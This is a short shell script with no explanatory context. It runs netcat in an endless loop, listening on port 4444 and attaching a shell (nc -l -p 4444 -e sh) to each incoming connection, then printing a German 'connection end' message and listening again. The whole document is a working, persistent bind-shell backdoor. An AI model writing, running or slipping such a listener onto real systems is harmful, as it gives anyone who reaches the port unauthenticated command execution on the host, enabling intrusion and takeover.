PATH=/bin
echo ==START
while :; do nc -l -p 4444 -e sh; echo ==VERBINDUNG-ENDE; done
